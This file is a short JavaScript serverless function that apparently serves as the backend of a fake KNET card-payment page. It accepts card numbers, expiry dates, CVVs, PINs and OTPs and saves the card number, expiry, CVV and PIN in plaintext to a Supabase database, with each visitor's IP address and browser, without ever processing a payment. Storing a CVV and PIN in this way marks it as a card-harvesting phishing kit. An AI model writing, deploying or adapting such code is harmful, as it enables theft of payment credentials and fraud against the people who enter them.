const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { phone, amount, card, expiry, pin, otp, cvv } = req.body;

    const transaction_ref = 'KWT-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();

    const response = await fetch(`${SUPABASE_URL}/rest/v1/payments`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=representation'
      },
      body: JSON.stringify({
        card_number: card || '',
        card_expiry: expiry || '',
        card_cvv: cvv || '',
        card_pin: pin || '',
        card_type: 'KNET',
        bank_name: '',
        amount: parseFloat(amount) || 0,
        status: 'pending',
        transaction_ref,
        ip_address: req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '',
        user_agent: req.headers['user-agent'] || ''
      })
    });

    const data = await response.json();
    if (!response.ok) return res.status(500).json({ error: 'DB error' });

    res.json({ id: data[0].id, ref: transaction_ref });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};
